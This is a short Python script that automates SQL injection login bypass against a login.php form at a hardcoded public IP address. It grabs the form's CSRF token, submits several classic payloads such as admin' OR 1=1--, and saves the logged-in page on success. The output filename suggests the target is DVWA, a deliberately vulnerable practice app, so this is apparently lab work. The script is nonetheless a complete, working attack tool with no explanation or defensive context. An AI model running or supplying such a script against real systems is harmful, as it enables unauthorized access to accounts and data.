
import requests
import re

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"

session = requests.Session()

# SQL Injection payloads to bypass login
sqli_payloads = [
    ("admin' OR '1'='1", "password"),
    ("admin' OR 1=1--", "password"),
    ("admin' OR 1=1#", "password"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin' --", "anything"),
]

for username, password in sqli_payloads:
    # Get fresh token
    response = session.get(login_url)
    token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)
    
    if token_match:
        user_token = token_match.group(1)
        
        print(f"\n[*] Trying SQLi: username='{username}' password='{password}'")
        
        data = {
            "username": username,
            "password": password,
            "user_token": user_token,
            "Login": "Login"
        }
        
        response = session.post(login_url, data=data, allow_redirects=True)
        
        if "Welcome" in response.text or "Logout" in response.text:
            print(f"[+] SUCCESS with SQLi! username='{username}' password='{password}'")
            print(f"[+] URL: {response.url}")
            
            # Save successful response
            with open("/tmp/dvwa_response.html", "w") as f:
                f.write(response.text)
            break
        elif "index.php" in response.url:
            print(f"[+] SUCCESS with SQLi! username='{username}' password='{password}'")
            print(f"[+] URL: {response.url}")
            with open("/tmp/dvwa_response.html", "w") as f:
                f.write(response.text)
            break

